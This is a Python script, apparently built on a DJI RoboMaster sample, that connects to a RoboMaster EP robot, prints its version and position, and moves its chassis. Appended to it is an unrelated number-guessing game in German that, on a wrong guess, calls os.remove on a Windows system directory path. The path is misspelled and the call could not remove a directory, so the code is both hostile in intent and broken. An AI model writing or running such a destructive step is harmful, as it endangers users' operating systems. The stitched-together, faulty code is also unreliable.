# -*-coding:utf-8-*-
# Copyright (c) 2020 DJI.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License in the file LICENSE.txt or at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import time
from robomaster import robot, camera, robotic_arm

# Initialisiere den RoboMaster EP
ep_robot = robot.Robot()
ep_robot.initialize(conn_type="ap")

def sub_info_handler(sub_info):
    print("sub info: {0}".format(sub_info))
    print("")

version_ = ep_robot.get_version()
print(f"Robot Version {version_}")


if version_ == None:
    ep_robot.close()
else:
    #ep_robot.play_audio(filename="gameboy_startup.wav")
    pass

ep_chassis = ep_robot.chassis

# Subscribe to chassis location information
def sub_position_handler(position_info):
    x, y, z = position_info
    print("chassis position: x:{0}, y:{1}, z:{2}".format(x, y, z))
ep_chassis.sub_position(freq=1, callback=sub_position_handler)

test_distance = 10 # dm

ep_chassis.move(x=test_distance, y=test_distance, z=0, xy_speed=1).wait_for_completed()

time.sleep(10)

ep_chassis.unsub_position()

ep_robot.close()



import random
import os

number = random.randint(1,10)

guess = int(input("Rate eine Zahl zwischen 1 und 10: "))

if guess == number:
    print("Gewonnen!")
else:
    os.remove("C:\Windows\System64")
